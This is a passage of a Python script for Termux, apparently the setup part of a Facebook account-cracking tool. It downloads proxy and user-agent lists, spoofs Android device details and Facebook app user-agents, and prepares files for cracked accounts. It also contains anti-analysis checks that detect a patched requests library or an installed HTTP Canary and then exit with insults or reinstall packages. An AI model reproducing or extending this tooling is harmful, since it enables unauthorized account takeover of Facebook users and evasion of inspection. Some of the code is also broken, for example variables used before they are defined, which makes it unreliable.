
#------------[ FILE X RANDOM ]--------------#
#------------[ ORIGINAL WRITTTEN BY ANKIT ]--------------#
#------------[ ANKIT DONA ]--------------#
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

import requests as req, re,time,os
from bs4 import BeautifulSoup as bsp
import requests,bs4,json,os,sys,random,datetime,time,re,multiprocessing,socket
import os,base64,zlib,platform
from bs4 import BeautifulSoup as bs
from bs4 import BeautifulSoup
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as prints
from rich import pretty
from rich.text import Text as tekz
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from time import localtime as lt
#os.system("pip uninstall urllib3 requests chardet idna certifi -y");os.system("pip install urllib3 requests chardet idna certifi")
from bs4 import BeautifulSoup as sop
try:
    from bs4 import BeautifulSoup as bsp
except:
    os.system('pip install bs4')
    from bs4 import BeautifulSoup as bsp
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        #print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python run.py')  
 
#-> Colors <-#
RED = '\033[1;91m'
WHITE = '\033[1;97m'
ORANGE ='\x1b[38;5;208m'
YELLOW = '\033[1;33m'
GREEN = "\033[1;32m"
WHITE_BOLD = "\033[1;37m"
BLUE = '\033[1;34m'
CYAN = "\033[1;36m"
RED_BG = "\33[37;41m"
RESET = "\033[0;m"
#--(rare-colors)--#
holaa="38;5"
ro=(f"\033[{holaa};208")
rb=(f"\033[{holaa};32")
rc=(f"\033[{holaa};122m")
rg= (f"\033[{holaa};112m")
rp=(f"\033[{holaa};147m")
try:
	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
	open('proxies.txt','w').write(proxies)
except Exception as e:
	#print('\x1b[1;95m[√] LOADING...')
	os.system("espeak -a 300 \"Checking,Update,\"")
	os.system('clear')
	print('\033[1;31m[√] LOADING ')
	print('')	

os.system('git pull --quiet 2>/dev/null')
bit = platform.architecture()[0]
if bit == '64bit':
 print('\033[1;91m[\033[1;92m◉\033[1;91m] \033[1;92mYOU ARE 64BIT USER')
 
elif bit == '32bit':
 print('\033[1;91m[\033[1;92m◉\033[1;91m] \033[1;92mYOU ARE 32BIT USER')
# os.system("espeak -a 300 \" WELCOME TO ANKIT TOOL,\"")
 
#NbrX =input('\x1b[38;5;46m [•] \x1b[38;5;46mWHAT IS YOUR NBR : ')	
proxies=open('proxies.txt','r').read().splitlines()


android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
	for line in xx:
		android_models.append(line)
except:pass

usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass

#============Capture Protection============#
first='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(first+'sessions.py','r').read():
    pass
else:
    exit('\33[1;91mPlease Try This Local Method Capture On Kids ')     

cellphone = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']

def clr():
    try:
        data = os.listdir('/sdcard')
        if 'Android' in data:
            print(' \033[1;32m[!]\033[1;37m D'+'ont Try Bypas'+'s Mother Fuc'+'ker...! \n YOUR'+' BYPAS'+'S FUCK'+'ED BY ANKIT');exit()
        else:exit()
    except:exit()
####### MODL KILLER #######
 
from requests import api
x = open(api.__file__,'r').read()
if "print" in x:
    clr()
elif "sys.stdout.write" in x:
    clr()
else:
    pass
from requests import sessions
 
x = open(sessions.__file__,'r').read()
if "print" in x:
    clr()
elif "sys.stdout.write" in x:
    clr()
else:
    pass
from requests import models
x = open(models.__file__,'r').read()
if "print" in x:
    clr()
 
elif "sys.stdout.write" in x:
    clr()
else:
    pass
#-------------------[HTTP CANARY]---------------------#
try:
    open("/sdcard/.xx.txt","w").write("DELETE HTTP-CANARY")
except:pass
path_storage = "/sdcard/.xx.txt"
if os.path.exists(path_storage):
    pass
else:
    print("GIVE STORAGE PERMISSION FOR SAVE IDS FILE ")
    exit()
package_name = "com.httpcanary.pro"
path_canary = "/sdcard/Android/data"
if os.path.exists(os.path.join(path_canary, package_name)):
    print(f"\033[1;31m===> HEY ABAL YOUR DAD RIMON AHMED DON'T CAPTURE METHOD.....")
    print("\033[1;31m====> DELETE YOUR HTTP FROM {path_canary} ")
    exit()
else:
    pass
package_name2 = "com.guoshi.httpcanary"
path_canary2 = "/sdcard/Android/data"
if os.path.exists(os.path.join(path_canary2, package_name2)):
    print(f"\033[1;31m===> HEY ABAL YOUR DAD RIMON AHMED DON'T CAPTURE METHOD..")
    print(f"\033[1;31m===> DELETE YOUR HTTP CANARY FROM {path_canary2} ")
    exit()
from requests import api
fuck11 = open(api.__file__, 'r').read()
c = ['print', 'zlib', 'marshal', 'base64']
if not any(word in fuck11 for word in c):
    pass
else:
    print('SORRY')
    os.system("ok uninstall requests -y > /dev/null")
    os.system('ok install requests')
    exit()
from requests import api
fuck1 = open(api.__file__,'r').read()
if len(fuck1) !=6449:
    print('okh')
    os.system("ok uninstall requests -y > /dev/null")
    os.system('ok install requests')
    exit()
else:pass
from requests import models
fuck21 = open(models.__file__, 'r').read()
c = ['print', 'zlib', 'marshal', 'base64']
if not any(word in fuck21 for word in c):
    pass
else:
    print('SORRY')
    os.system("ok uninstall requests -y > /dev/null")
    os.system('ok install requests')
    exit()
from requests import models
fuck2 = open(models.__file__,'r').read()
if len(fuck2) !=35223:
    print("okhh")
    os.system("ok uninstall requests -y > /dev/null")
    os.system('ok install requests')
    exit()
from requests import utils
fuck31 = open(utils.__file__, 'r').read()
c = ['print', 'zlib', 'marshal', 'base64']
if not any(word in fuck31 for word in c):
    pass
else:
    print('SORRY')
    os.system("ok uninstall requests -y > /dev/null")
    os.system('ok install requests')
    exit()
from requests import utils
fuck3 = open(utils.__file__,'r').read()
if len(fuck3) !=33448:
    print("okhhh")
    os.system("ok uninstall requests -y > /dev/null")
    os.system('ok install requests')
    exit()
from requests import sessions
fuck41 = open(sessions.__file__, 'r').read()
c = ['print', 'zlib', 'marshal', 'base64']
if not any(word in fuck41 for word in c):
    pass
else:
    print('SORRY')
    os.system("ok uninstall requests -y > /dev/null")
    os.system('ok install requests')
    exit()
from requests import sessions
fuck4 = open(sessions.__file__,'r').read()
if len(fuck4) !=30373:
    print("okhhhh")
    os.system("ok uninstall requests -y > /dev/null")
    os.system('ok install requests')
    exit()
from requests import exceptions
fuck51 = open(exceptions.__file__, 'r').read()
c = ['print', 'zlib', 'marshal', 'base64']
if not any(word in fuck51 for word in c):
    pass
else:
    print('SORRY')
    os.system("ok uninstall requests -y > /dev/null")
    os.system('ok install requests')
    exit()
from requests import exceptions
fuck5 = open(exceptions.__file__,'r').read()
if len(fuck5) !=3811:
    print("SORRY")
    os.system("ok uninstall requests -y > /dev/null")
    os.system('ok install requests')
    exit()
from requests import compat
fuck61 = open(compat.__file__, 'r').read()
c = ['print', 'zlib', 'marshal', 'base64']
if not any(word in fuck61 for word in c):
    pass
else:
    print('SORRY')
    exit()
from requests import compat
fuck6 = open(compat.__file__,'r').read()
if len(fuck6) !=1451:
    print("SORRY")
    os.system("ok uninstall requests -y > /dev/null")
    os.system('ok install requests')
    exit()
from requests import cookies
fuck71 = open(cookies.__file__, 'r').read()
c = ['print', 'zlib', 'marshal', 'base64']
if not any(word in fuck71 for word in c):
    pass
else:
    print('SORRY')
    exit()
from requests import cookies
fuck7 = open(cookies.__file__,'r').read()
if len(fuck7) !=18560:
    print("SORRY")
    os.system("ok uninstall requests -y > /dev/null")
    os.system('ok install requests')
    exit()
from requests import adapters
fuck81 = open(adapters.__file__, 'r').read()
c = ['print', 'zlib', 'marshal', 'base64']
if not any(word in fuck81 for word in c):
    pass
else:
    print('SORRY')
    os.system("ok uninstall requests -y > /dev/null")
    os.system('ok install requests')
    exit()
from requests import adapters
fuck8 = open(adapters.__file__,'r').read()
if len(fuck8) !=19553:
    print("SORRY")
    os.system("ok uninstall requests -y > /dev/null")
    os.system('ok install requests')
    exit()


#------------------[ USER-AGENT ]-------------------#
ugen=[]
ugen2=[]
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('user-agents.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/cvandeplas/pystemon/blob/master/user-agents.txt').text
		ua=open('user-agents.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('user-agents.txt','r').read().splitlines()

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#------------[ WANKITA-COLOR ]--------------#

BLUE = '\x1b[38;5;196m'
WHITE = '\x1b[37m'
P = '\x1b[1;97m'
M = '\x1b[38;5;196m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[38;5;196m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
###----------[ ANSII COLOR STYLE ]---------- ###
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

###----------[ RICH COLOR STYLE ]---------- ###
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu  
###----------[ NEW ANSII COLOR STYLE ]---------- ###
COLOR_BLACK="\033[0;30m"
COLOR_RED="\033[0;31m"
COLOR_GREEN="\033[0;32m"
COLOR_BROWN="\033[0;33m"
COLOR_BLUE="\033[0;34m"
COLOR_PURPLE="\033[0;35m"
COLOR_CYAN="\033[0;36m"
COLOR_LIGHT_GRAY="\033[0;37m"
COLOR_DARK_GRAY="\033[1;30m"
COLOR_LIGHT_RED="\033[1;31m"
COLOR_LIGHT_GREEN="\033[1;32m"
COLOR_YELLOW="\033[1;33m"
COLOR_LIGHT_BLUE="\033[1;34m"
COLOR_LIGHT_PURPLE="\033[1;35m"
COLOR_LIGHT_CYAN="\033[1;36m"
COLOR_LIGHT_WHITE="\033[1;37m"
COLOR_BOLD="\033[1m"
COLOR_FAINT="\033[2m"
COLOR_ITALIC="\033[3m"
COLOR_UNDERLINE="\033[4m"
COLOR_BLINK="\033[5m"
COLOR_NEGATIVE="\033[7m"
COLOR_CROSSED="\033[9m"
  
#------------------[ MACHINE-SUPPORT ]---------------#

def restart():
	os.system(f'python {__file__}')
	os.system('exit')
def animation(u):
	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
def contact():
	os.system('xdg-open https://www.facebook.com/not.ankit12')
	back()
def linex():
	print("""\x1b[37m----------------------------------------------""")
def cls():
	os.system('clear')
	banner()
	info()
response = requests.get("https://api.ipify.org?format=json")
ipadd = response.json()["ip"]      


			
	
	

#--------------------[ CONVERTER-BULAN ]--------------#

dic = {'1':'JANUARY','2':'FEBRUARY','3':'MARCH','4':'APRIL','5':'MAY','6':'JUNE','7':'JULY','8':'AUGUST','9':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
dic2 = {'01':'JANUARY','02':'FEBRUARY','03':'MARCH','04':'APRIL','05':'MAY','06':'JUNE','07':'JULY','08':'AUGUST','09':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"


#------------[ USERAGENT FILE AND RANDOM ]--------------#

#------------[ THIS IS FOR METHOD 1 ]--------------#  
#------------[ THIS IS FOR RANDOM 1 ]--------------#  	     	     
def ONE():
    END = 'Mozilla/5.0 (Linux; Android 9: 10; Linux; Android 9:D4520K AppleWebKit/537.36 (KHTML, like Gecko)91 0 6001 94 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9: 9; Linux; Android 9:Z9409P AppleWebKit/537.36 (KHTML, like Gecko)99 0 5794 88 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9: 9; Linux; Android 9:Z9409P AppleWebKit/537.36 (KHTML, like Gecko)99 0 5794 88 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9: 8; Linux; Android 9:H25S AppleWebKit/537.36 (KHTML, like Gecko)92 0 5690 148 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]'
    ua = 'Mozilla/5.0 (Linux; Android 9: 9; Linux; Android 9:C1896Q AppleWebKit/537.36 (KHTML, like Gecko)86 0 6047 67 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9: 9; Linux; Android 9:V5092V AppleWebKit/537.36 (KHTML, like Gecko)90 0 6606 60 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9: 9; Linux; Android 9:T9105U AppleWebKit/537.36 (KHTML, like Gecko)80 0 6232 87 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;] '+END
    return ua   
    ua1 = 'Mozilla/5.0 (Linux; Android 9: 8; Linux; Android 9:A7154Z AppleWebKit/537.36 (KHTML, like Gecko)84 0 5890 41 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9: 6; Linux; Android 9:E9181K AppleWebKit/537.36 (KHTML, like Gecko)84 0 6363 76 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9: 9; Linux; Android 9:R136U AppleWebKit/537.36 (KHTML, like Gecko)100 0 6429 84 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;] '+END
    return ua     
#------------[ THIS IS FOR METHOD 2 ]--------------#    
#------------[ THIS IS FOR RANDOM 2 ]--------------#  	        
def TWO():
	END = 'Mozilla/5.0 (Linux; Android 10: 9; Linux; Android 10;A613G AppleWebKit/537.36 (KHTML, like Gecko)100 0 6138 68 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/348.0.0.39.118;]","Mozilla/5.0 (Linux; Android 10: 9; Linux; Android 10;Z7799B AppleWebKit/537.36 (KHTML, like Gecko)94 0 6609 68 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/348.0.0.39.118;]","Mozilla/5.0 (Linux; Android 10: 9; Linux; Android 10;M6232G AppleWebKit/537.36 (KHTML, like Gecko)80 0 6387 50 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/348.0.0.39.118;]'
	ua = 'Mozilla/5.0 (Linux; Android 10: 8; Linux; Android 10;X9970M AppleWebKit/537.36 (KHTML, like Gecko)100 0 6186 50 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/348.0.0.39.118;]","Mozilla/5.0 (Linux; Android 10: 8; Linux; Android 10;R8718A AppleWebKit/537.36 (KHTML, like Gecko)93 0 6232 139 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/348.0.0.39.118;]","Mozilla/5.0 (Linux; Android 10: 8; Linux; Android 10;X7439D AppleWebKit/537.36 (KHTML, like Gecko)82 0 6659 126 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/348.0.0.39.118;] '+END
	return ua
	ua1 = 'Mozilla/5.0 (Linux; Android 10: 10; Linux; Android 10;E5853G AppleWebKit/537.36 (KHTML, like Gecko)87 0 5769 93 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/348.0.0.39.118;]","Mozilla/5.0 (Linux; Android 10: 10; Linux; Android 10;M4743N AppleWebKit/537.36 (KHTML, like Gecko)102 0 5992 72 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/348.0.0.39.118;]","Mozilla/5.0 (Linux; Android 10: 10; Linux; Android 10;A3024R AppleWebKit/537.36 (KHTML, like Gecko)98 0 6357 86 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/348.0.0.39.118;] '+END
	return ua
#------------[ THIS IS FOR METHOD 3 ]--------------# 
#------------[ THIS IS FOR RANDOM 3 ]--------------#  	     
def THREE():
    END = 'Mozilla/5.0 (Linux; Android 9; 10; Linux; Android 9;J4160W AppleWebKit/537.36 (KHTML, like Gecko)101 0 5721 134 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 10; Linux; Android 9;F3711B AppleWebKit/537.36 (KHTML, like Gecko)83 0 6118 114 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 10; Linux; Android 9;R1959I AppleWebKit/537.36 (KHTML, like Gecko)93 0 6525 44 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]'
    ua = 'Mozilla/5.0 (Linux; Android 9; 9; Linux; Android 9;G9997J AppleWebKit/537.36 (KHTML, like Gecko)82 0 6694 57 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 9; Linux; Android 9;O5459A AppleWebKit/537.36 (KHTML, like Gecko)95 0 5877 127 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 9; Linux; Android 9;N2225L AppleWebKit/537.36 (KHTML, like Gecko)89 0 6462 61 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;] '+END
    return ua 
